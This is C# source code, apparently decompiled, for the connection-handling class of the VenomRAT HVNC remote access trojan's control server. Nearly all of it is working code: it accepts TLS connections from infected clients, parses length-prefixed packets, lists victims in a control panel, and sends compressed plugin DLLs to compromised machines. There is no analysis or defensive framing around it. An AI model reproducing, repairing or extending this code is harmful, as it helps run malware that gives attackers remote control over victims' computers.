using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Properties;
using VenomRAT_HVNC.Server.Algorithm;
using VenomRAT_HVNC.Server.Handle_Packet;
using VenomRAT_HVNC.Server.Helper;
using VenomRAT_HVNC.Server.Properties;
using Settings = VenomRAT_HVNC.Server.Settings;

namespace VenomRAT_HVNC.Server.Connection
{
    // Token: 0x02000036 RID: 54
    public class Clients
    {
        // Token: 0x17000036 RID: 54
        // (get) Token: 0x060001D8 RID: 472 RVA: 0x0001A911 File Offset: 0x0001A911
        // (set) Token: 0x060001D9 RID: 473 RVA: 0x0001A919 File Offset: 0x0001A919
        public Socket TcpClient { get; set; }

        // Token: 0x17000037 RID: 55
        // (get) Token: 0x060001DA RID: 474 RVA: 0x0001A922 File Offset: 0x0001A922
        // (set) Token: 0x060001DB RID: 475 RVA: 0x0001A92A File Offset: 0x0001A92A
        public SslStream SslClient { get; set; }

        // Token: 0x17000038 RID: 56
        // (get) Token: 0x060001DC RID: 476 RVA: 0x0001A933 File Offset: 0x0001A933
        // (set) Token: 0x060001DD RID: 477 RVA: 0x0001A93B File Offset: 0x0001A93B
        public ListViewItem LV { get; set; }

        // Token: 0x17000039 RID: 57
        // (get) Token: 0x060001DE RID: 478 RVA: 0x0001A944 File Offset: 0x0001A944
        // (set) Token: 0x060001DF RID: 479 RVA: 0x0001A94C File Offset: 0x0001A94C
        public ListViewItem LV2 { get; set; }

        // Token: 0x1700003A RID: 58
        // (get) Token: 0x060001E0 RID: 480 RVA: 0x0001A955 File Offset: 0x0001A955
        // (set) Token: 0x060001E1 RID: 481 RVA: 0x0001A95D File Offset: 0x0001A95D
        public string ID { get; set; }

        // Token: 0x1700003B RID: 59
        // (get) Token: 0x060001E2 RID: 482 RVA: 0x0001A966 File Offset: 0x0001A966
        // (set) Token: 0x060001E3 RID: 483 RVA: 0x0001A96E File Offset: 0x0001A96E
        private byte[] ClientBuffer { get; set; }

        // Token: 0x1700003C RID: 60
        // (get) Token: 0x060001E4 RID: 484 RVA: 0x0001A977 File Offset: 0x0001A977
        // (set) Token: 0x060001E5 RID: 485 RVA: 0x0001A97F File Offset: 0x0001A97F
        private long HeaderSize { get; set; }

        // Token: 0x1700003D RID: 61
        // (get) Token: 0x060001E6 RID: 486 RVA: 0x0001A988 File Offset: 0x0001A988
        // (set) Token: 0x060001E7 RID: 487 RVA: 0x0001A990 File Offset: 0x0001A990
        private long Offset { get; set; }

        // Token: 0x1700003E RID: 62
        // (get) Token: 0x060001E8 RID: 488 RVA: 0x0001A999 File Offset: 0x0001A999
        // (set) Token: 0x060001E9 RID: 489 RVA: 0x0001A9A1 File Offset: 0x0001A9A1
        private bool ClientBufferRecevied { get; set; }

        // Token: 0x1700003F RID: 63
        // (get) Token: 0x060001EA RID: 490 RVA: 0x0001A9AA File Offset: 0x0001A9AA
        // (set) Token: 0x060001EB RID: 491 RVA: 0x0001A9B2 File Offset: 0x0001A9B2
        public object SendSync { get; set; }

        // Token: 0x17000040 RID: 64
        // (get) Token: 0x060001EC RID: 492 RVA: 0x0001A9BB File Offset: 0x0001A9BB
        // (set) Token: 0x060001ED RID: 493 RVA: 0x0001A9C3 File Offset: 0x0001A9C3
        public long BytesRecevied { get; set; }

        // Token: 0x17000041 RID: 65
        // (get) Token: 0x060001EE RID: 494 RVA: 0x0001A9CC File Offset: 0x0001A9CC
        // (set) Token: 0x060001EF RID: 495 RVA: 0x0001A9D4 File Offset: 0x0001A9D4
        public string Ip { get; set; }

        // Token: 0x17000042 RID: 66
        // (get) Token: 0x060001F0 RID: 496 RVA: 0x0001A9DD File Offset: 0x0001A9DD
        // (set) Token: 0x060001F1 RID: 497 RVA: 0x0001A9E5 File Offset: 0x0001A9E5
        public bool Admin { get; set; }

        // Token: 0x17000043 RID: 67
        // (get) Token: 0x060001F2 RID: 498 RVA: 0x0001A9EE File Offset: 0x0001A9EE
        // (set) Token: 0x060001F3 RID: 499 RVA: 0x0001A9F6 File Offset: 0x0001A9F6
        public DateTime LastPing { get; set; }

        // Token: 0x060001F4 RID: 500 RVA: 0x0001AA00 File Offset: 0x0001AA00
        public Clients(Socket socket)
        {
            this.SendSync = new object();
            this.TcpClient = socket;
            this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[] { ':' })[0];
            this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
            this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
        }

        // Token: 0x060001F5 RID: 501 RVA: 0x0001AA8C File Offset: 0x0001AA8C
        private void EndAuthenticate(IAsyncResult ar)
        {
            try
            {
                this.SslClient.EndAuthenticateAsServer(ar);
                this.Offset = 0L;
                this.HeaderSize = 4L;
                this.ClientBuffer = new byte[this.HeaderSize];
                this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
            }
            catch
            {
                SslStream sslClient = this.SslClient;
                if (sslClient != null)
                {
                    sslClient.Dispose();
                }
                Socket tcpClient = this.TcpClient;
                if (tcpClient != null)
                {
                    tcpClient.Dispose();
                }
            }
        }

        // Token: 0x060001F6 RID: 502 RVA: 0x0001AB2C File Offset: 0x0001AB2C
        public void ReadClientData(IAsyncResult ar)
        {
            try
            {
                if (!this.TcpClient.Connected)
                {
                    this.Disconnected();
                }
                else
                {
                    int num = this.SslClient.EndRead(ar);
                    if (num > 0)
                    {
                        this.HeaderSize -= (long)num;
                        this.Offset += (long)num;
                        if (!this.ClientBufferRecevied)
                        {
                            if (this.HeaderSize == 0L)
                            {
                                this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
                                if (this.HeaderSize > 0L)
                                {
                                    this.ClientBuffer = new byte[this.HeaderSize];
                                    this.Offset = 0L;
                                    this.ClientBufferRecevied = true;
                                }
                            }
                            else if (this.HeaderSize < 0L)
                            {
                                this.Disconnected();
                                return;
                            }
                        }
                        else
                        {
                            object lockReceivedSendValue = Settings.LockReceivedSendValue;
                            lock (lockReceivedSendValue)
                            {
                                Settings.ReceivedValue += (long)num;
                            }
                            this.BytesRecevied += (long)num;
                            if (this.HeaderSize == 0L)
                            {
                                ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
                                {
                                    client = this,
                                    data = this.ClientBuffer
                                }.Read), null);
                                this.Offset = 0L;
                                this.HeaderSize = 4L;
                                this.ClientBuffer = new byte[this.HeaderSize];
                                this.ClientBufferRecevied = false;
                            }
                            else if (this.HeaderSize < 0L)
                            {
                                this.Disconnected();
                                return;
                            }
                        }
                        this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
                    }
                    else
                    {
                        this.Disconnected();
                    }
                }
            }
            catch
            {
                this.Disconnected();
            }
        }

        // Token: 0x060001F7 RID: 503 RVA: 0x0001AD10 File Offset: 0x0001AD10
        public void Disconnected()
        {
            if (this.LV != null)
            {
                Program.form1.Invoke(new MethodInvoker(delegate ()
                {
                    try
                    {
                        object lockListviewClients = Settings.LockListviewClients;
                        lock (lockListviewClients)
                        {
                            this.LV.Remove();
                        }
                        if (this.LV2 != null)
                        {
                            object lockListviewThumb = Settings.LockListviewThumb;
                            lock (lockListviewThumb)
                            {
                                this.LV2.Remove();
                            }
                        }
                    }
                    catch
                    {
                    }
                    new HandleLogs().Addmsg("Client " + this.Ip + " disconnected.", Color.Gainsboro);
                    TimeZoneInfo local = TimeZoneInfo.Local;
                    if (local.Id == "China Standard Time" && global::VenomRAT_HVNC.Server.Properties.Settings.Default.Notification)
                    {
                        //SoundPlayer soundPlayer = new SoundPlayer(Resources.offline);
                        //soundPlayer.Load();
                        //soundPlayer.Play();
                    }
                    foreach (AsyncTask asyncTask in Form1.getTasks.ToList<AsyncTask>())
                    {
                        asyncTask.doneClient.Remove(this.ID);
                    }
                }));
            }
            try
            {
                SslStream sslClient = this.SslClient;
                if (sslClient != null)
                {
                    sslClient.Dispose();
                }
                Socket tcpClient = this.TcpClient;
                if (tcpClient != null)
                {
                    tcpClient.Dispose();
                }
            }
            catch
            {
            }
        }

        // Token: 0x060001F8 RID: 504 RVA: 0x0001AD74 File Offset: 0x0001AD74
        public bool GetListview(string id)
        {
            foreach (object obj in Program.form1.listView44.Items)
            {
                ListViewItem listViewItem = (ListViewItem)obj;
                if (listViewItem.ToolTipText == id)
                {
                    return true;
                }
            }
            return false;
        }

        // Token: 0x060001F9 RID: 505 RVA: 0x0001ADE4 File Offset: 0x0001ADE4
        public void Send(object msg)
        {
            object sendSync = this.SendSync;
            lock (sendSync)
            {
                try
                {
                    if (!this.TcpClient.Connected)
                    {
                        this.Disconnected();
                    }
                    else if ((byte[])msg != null)
                    {
                        byte[] array = (byte[])msg;
                        byte[] bytes = BitConverter.GetBytes(array.Length);
                        this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.SslClient.Write(bytes, 0, bytes.Length);
                        if (array.Length > 1000000)
                        {
                            using (MemoryStream memoryStream = new MemoryStream(array))
                            {
                                memoryStream.Position = 0L;
                                byte[] array2 = new byte[50000];
                                int num;
                                while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
                                {
                                    this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                                    this.SslClient.Write(array2, 0, num);
                                    object lockReceivedSendValue = Settings.LockReceivedSendValue;
                                    lock (lockReceivedSendValue)
                                    {
                                        Settings.SentValue += (long)num;
                                    }
                                }
                                goto IL_15B;
                            }
                        }
                        this.TcpClient.Poll(-1, SelectMode.SelectWrite);
                        this.SslClient.Write(array, 0, array.Length);
                        this.SslClient.Flush();
                        object lockReceivedSendValue2 = Settings.LockReceivedSendValue;
                        lock (lockReceivedSendValue2)
                        {
                            Settings.SentValue += (long)array.Length;
                        }
                    IL_15B:;
                    }
                }
                catch
                {
                    this.Disconnected();
                }
            }
        }

        // Token: 0x060001FA RID: 506 RVA: 0x0001AFE0 File Offset: 0x0001AFE0
        public void SendPlugin(string hash)
        {
            try
            {
                foreach (string text in Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly))
                {
                    if (hash == GetHash.GetChecksum(text))
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
                        msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
                        msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
                        ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
                        new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + this.Ip, Color.Gainsboro);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("Clinet " + this.Ip + " " + ex.Message, Color.Gainsboro);
            }
        }
    }
}